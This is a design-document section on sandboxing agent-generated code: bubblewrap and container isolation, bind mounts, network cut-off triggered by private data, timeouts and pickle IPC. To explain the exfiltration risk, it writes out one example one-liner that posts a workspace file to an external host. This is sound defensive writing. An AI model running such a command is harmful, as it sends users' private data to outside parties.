## Code Sandbox

When agents use the CodeAct pattern -- generating and executing arbitrary code to accomplish tasks -- they need an execution environment that is isolated, recoverable, and auditable. A sandbox provides this environment. It sits between the agent and the host operating system, enforcing boundaries that the agent's code cannot circumvent.

This section describes the concepts and mechanisms behind sandboxed execution. The sandbox is a library-level abstraction: it provides the building blocks that higher-level systems (MCP servers, API services, CLI tools) compose into complete execution environments.

### Why Agents Need Sandboxes

A Python snippet can open files, make network requests, spawn processes, or modify the filesystem in ways that no tool permission system can anticipate. The sandbox addresses this by enforcing isolation at the infrastructure level. Rather than trying to restrict what code can do through static analysis or allow-lists (which are brittle and bypassable), the sandbox constrains the environment in which the code runs.

### Process Isolation

The fundamental mechanism is process isolation: executing the agent's code in a separate process with restricted access to the host system.

#### Lightweight Isolation: Bubblewrap

On Linux, [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) provides user-namespace-based isolation without requiring root privileges or a container runtime. It creates a minimal filesystem view by selectively bind-mounting only the paths the child process needs:

```python
class SandboxBubblewrap(Sandbox):
    def _build_command(
        self,
        command: list[str],
        bind_mounts: list[BindMount],
        isolate_network: bool,
        isolate_pid: bool,
        cwd: str | None,
    ) -> list[str]:
        cmd = [
            "bwrap",
            "--ro-bind", "/usr", "/usr",
            "--ro-bind", "/lib", "/lib",
            "--ro-bind", "/lib64", "/lib64",
            "--ro-bind", "/bin", "/bin",
            "--ro-bind", "/sbin", "/sbin",
            "--ro-bind", "/etc/resolv.conf", "/etc/resolv.conf",
            "--proc", "/proc",
            "--dev", "/dev",
            "--tmpfs", "/tmp",
        ]

        # Bind Python prefix so the child can import installed packages
        python_prefix = Path(sys.prefix)
        if python_prefix != Path("/usr"):
            cmd.extend(["--ro-bind", str(python_prefix), str(python_prefix)])

        for mount in bind_mounts:
            flag = "--ro-bind" if mount.readonly else "--bind"
            cmd.extend([flag, str(mount.source), mount.target])

        if isolate_pid:
            cmd.append("--unshare-pid")
        if isolate_network:
            cmd.append("--unshare-net")
        if cwd:
            cmd.extend(["--chdir", cwd])

        cmd.append("--")
        cmd.extend(command)
        return cmd
```

The child process sees a read-only root filesystem, a private `/tmp`, and only the bind mounts explicitly granted. The Python prefix is mounted read-only so that installed packages remain importable inside the sandbox. PID and network namespaces can be unshared independently. This is lightweight (no daemon, no images, no layers) and fast to start.

#### Fallback: Plain Subprocess

On platforms without bwrap (macOS, Windows), a subprocess fallback runs the command directly. No isolation is provided -- this is a development convenience, not a security boundary. The factory function selects the appropriate implementation:

```python
def get_sandbox() -> Sandbox:
    if shutil.which("bwrap"):
        return SandboxBubblewrap()
    return SandboxSubprocess()
```

#### Heavyweight Isolation: Containers

For production multi-tenant deployments, container runtimes (Docker, Podman) provide stronger isolation: separate filesystem layers, cgroup resource limits, full network namespace control, and seccomp profiles. Container-based sandboxes are heavier to start and manage, but offer guarantees that bwrap alone does not (CPU/memory limits, storage quotas, image-based reproducibility).

The sandbox abstraction accommodates both: the `Sandbox` ABC defines a uniform `run()` interface, and implementations range from "no isolation" through "user namespaces" to "full containers". The choice depends on the deployment context.

### Filesystem Isolation

The agent's code needs to read and write files, but it should only access its own workspace -- not the host filesystem, not other users' data.

#### Bind Mounts

The sandbox exposes specific host directories to the child process through bind mounts. A `BindMount(source, target, readonly)` maps a host path to a path visible inside the sandbox:

```python
bind_mounts = [
    BindMount(workspace_path, "/workspace"),           # read-write
    BindMount(temp_dir, str(temp_dir)),                # IPC channel
]
```

Inside the sandbox, the code sees `/workspace` as its working directory. It has no way to access paths outside the mounted directories.

#### Multi-Tenant Directory Layout

When multiple users and sessions share a host, each session gets its own workspace directory:

```
{data_dir}/
  {user_id}/
    {session_id}/
      [session files]
```

The sandbox mounts only the current session's directory. Physical separation at the filesystem level prevents cross-session access without relying on application-level checks.

#### Path Translation

A translation layer converts between the agent-visible path (`/workspace/report.csv`) and the host path (`/data/users/alice/session-42/report.csv`). This happens at the boundary between the application and the sandbox -- the agent's code never sees host paths, and the host system never trusts agent-provided paths without translation and traversal checks.

### Network Isolation

Network access is the primary exfiltration vector for code running inside a sandbox. An agent that has loaded sensitive data into its workspace could POST it to an external server. Tool permissions cannot prevent this because the code runs outside the tool framework -- a one-liner like `requests.post("https://external.com", data=open("/workspace/data.csv").read())` bypasses every permission check because it never goes through the tool-calling path.

#### Binary Network Control

The simplest and most auditable approach is a binary choice: the sandbox either has full network access or none at all. On bwrap, `--unshare-net` removes all network interfaces except loopback. On Docker, `network_mode="none"` does the same -- no DNS resolution, no TCP connections, no UDP traffic. The container becomes a compute island that can read and write files on its mounted workspace but cannot reach anything beyond `127.0.0.1`.

There is no allow-list, no proxy, no partial access. This eliminates configuration errors and makes the security property trivial to verify.

#### Data-Sensitivity-Driven Switching

The `PrivateData` compliance module drives the network switch. When a connector retrieves sensitive records -- patient data from a database, financial reports from an internal API -- it calls `PrivateData.add_private_dataset()` to register the dataset and its sensitivity level. The sandbox checks this state and selects the network mode accordingly:

```python
class NetworkMode(str, Enum):
    FULL = "bridge"
    NONE = "none"

def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
    if session_has_private_data(user_id, session_id):
        return NetworkMode.NONE
    return NetworkMode.FULL
```

This is a one-way ratchet: once sensitive data enters a session, network access never returns. The sensitivity level can escalate (from INTERNAL to CONFIDENTIAL to SECRET) but never decrease. This mirrors the real-world principle that you cannot "un-see" data -- once an agent has processed confidential records, any subsequent code it generates could embed fragments of that data in network requests.

#### Dynamic Container Recreation

The sandbox manager checks `get_network_mode()` on every session access and compares the result against the container's current network mode. If the required mode is more restrictive, the manager stops the container and creates a new one with the correct network configuration.

The workspace directory survives this recreation because it lives on the host filesystem as a bind mount. The old sandbox is destroyed, a new one is created with network disabled, and the same workspace is mounted again. From the agent's perspective, all files are still present -- only network destinations that were previously reachable now return connection errors.

For a better user experience, the system can inject a message into the agent's context when the network mode changes:

```
[SYSTEM] Network access has been restricted because private data
entered this session. Outbound connections are blocked.
```

The agent can then decide to work with the data locally, or ask the user for guidance.

#### Beyond Binary: Proxy-Based Selective Connectivity

The binary switch works well when data sensitivity is clear-cut, but enterprise workflows often need to combine private data with trusted external services: an internal company API, a data warehouse behind the VPN, a cloud service with a Zero Data Retention (ZDR) agreement. Cutting all network access forces the agent to stop mid-task whenever it needs to reach one of these services after private data has entered the session.

A more sophisticated approach places a proxy (such as Envoy) between the container and the network. The architecture uses two Docker networks. The first is an internal network with no external route, connecting only the sandbox container and the proxy. The second is the default bridge network that gives the proxy access to the outside world. The sandbox cannot reach the internet directly; it can only reach the proxy, and the proxy decides what traffic to forward based on a platform-level whitelist.

```
                  internal network              bridge network
                  (no gateway)                  (internet access)

 +-------------+                 +-------+                    +-----------+
 |  Sandbox    | --- HTTP(S) --> | Envoy | --- HTTP(S) -->    | Trusted   |
 |  Container  |                 | Proxy |                    | Services  |
 +-------------+                 +-------+                    +-----------+
                                     |
                                     X--- blocked -->  Untrusted destinations
```

With this proxy in place, the `NetworkMode` enum gains a third option:

```python
class NetworkMode(str, Enum):
    FULL = "bridge"
    PROXIED = "proxied"   # whitelist-only via proxy
    NONE = "none"
```

The mode selection then considers the sensitivity level: PUBLIC and INTERNAL data get full access, CONFIDENTIAL data triggers proxied mode, and SECRET data triggers the full network kill. The ratchet behavior still applies.

This proxy-based approach is not implemented in our POC. The binary FULL/NONE switch covers the most common scenarios and is simple to deploy and audit. The proxy pattern is presented here as a design direction for production deployments where blanket network removal is too restrictive.

### Timeout Enforcement

Agent-generated code can loop forever, deadlock, or simply take longer than acceptable. Reliable timeout enforcement requires process-level control -- you cannot reliably interrupt a thread executing arbitrary code.

The sandbox starts the child process, then uses `asyncio.wait_for` with a timeout. If the timeout expires, the process is killed:

```python
try:
    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
    return SandboxResult(exit_code=process.returncode, stdout=stdout, stderr=stderr)
except asyncio.TimeoutError:
    process.kill()
    await process.wait()
    return SandboxResult(exit_code=-1, timed_out=True)
```

The calling code receives a `SandboxResult` with `timed_out=True` and can report the timeout to the agent without crashing the host process.

### Inter-Process Communication

The sandbox runs code in a separate process. The calling code needs to send input (source code, namespace state) and receive output (results, stdout, stderr, figures). Two common patterns:

#### Pickle IPC

The REPL module uses pickle-based IPC through the filesystem. The caller writes a pickle file to a temp directory, the sandbox mounts that directory, the executor reads input and writes output as pickle files:

```python
# Caller side
(temp_dir / "input.pkl").write_bytes(pickle.dumps(input_data))
result = await sandbox.run(command, bind_mounts=[BindMount(temp_dir, str(temp_dir))], ...)
output = pickle.loads((temp_dir / "output.pkl").read_bytes())
```

This works because the temp directory is bind-mounted into the sandbox, giving both sides access. The approach is simple and supports arbitrary Python objects (dataframes, figures, custom classes).

#### Stdout/Stderr Capture

For simpler cases, the sandbox captures the child process's stdout and stderr as byte strings in `SandboxResult`. This suffices for commands that produce text output and where the only structured result is the exit code.

### Resource Limits

Beyond filesystem and network isolation, production sandboxes need resource limits to prevent a single session from exhausting host resources.

**CPU and memory**: Container runtimes enforce these through cgroups. Bwrap does not manage cgroups, so resource limits require either a container runtime or external cgroup management.

**Execution time**: Handled by the timeout mechanism described above.

**Storage**: Workspace directories can be placed on quota-managed filesystems or volume-limited container mounts.

**Process count**: PID namespace isolation (`--unshare-pid` in bwrap, default in containers) prevents fork bombs from affecting the host.

### Session Lifecycle

In a multi-tenant system, sandboxes are tied to user sessions. The lifecycle follows a predictable pattern:

**Lazy creation**: The sandbox is not created when the user connects. It is created on first code execution, avoiding resource allocation for sessions that never run code.

**Activity tracking**: Each code execution updates a timestamp. Sessions that remain idle beyond a configurable timeout are eligible for cleanup.

**Failure recovery**: If a sandbox process crashes or is killed externally, the next execution attempt detects the failure and creates a new sandbox. The workspace persists through failures because it lives on the host filesystem, making the sandbox a disposable execution environment.

**Cleanup**: Background processes periodically remove expired sessions and their sandbox resources. Cleanup operations are defensive -- errors in cleaning one session do not prevent cleanup of others.

### Security Layers

The sandbox is one layer in a defense-in-depth approach to agent security:

1. **Tool permissions** (`@tool_permission` with READ/WRITE/CONNECT) constrain what the agent can do through its normal tool-calling interface.
2. **Sandbox isolation** constrains what the agent's generated code can do at the infrastructure level -- filesystem, network, process, and resource boundaries.
3. **Data compliance** drives sandbox configuration automatically, tightening isolation when sensitive data enters a session.

These layers are independent and protect against different vectors:

```
Agent
  |
  |-- Tool call path
  |     @tool_permission(CONNECT) blocks exfiltration tools
  |
  |-- Code execution path (sandbox)
        Network isolation blocks network at infrastructure level
```

Neither layer depends on the other. Tool permissions cannot prevent code from making network requests inside a sandbox. Sandbox network isolation cannot prevent a tool from calling an external API. Together with the `PrivateData` compliance module that drives both layers, the system provides a coherent data protection pipeline: connectors tag data as it enters the session, tool permissions restrict the agent's tool vocabulary, and the sandbox restricts the network reach. A failure or misconfiguration in one layer does not expose data through the other.

### Design Trade-offs

**One sandbox per session** simplifies lifecycle management (no shared state, no cross-session interference) but costs more resources than pooling. For strong isolation, this trade-off is worthwhile.

**Binary network control** (full access or none) is the default, with proxy-based selective connectivity available as a production extension for workflows that require it.

**Pickle IPC** supports rich Python objects but introduces deserialization risks. The temp directory is short-lived and mounted read-write only for the duration of execution, limiting the attack surface.

**Subprocess fallback** provides no isolation on non-Linux platforms. This is acceptable for development but must not be used in production with untrusted code.
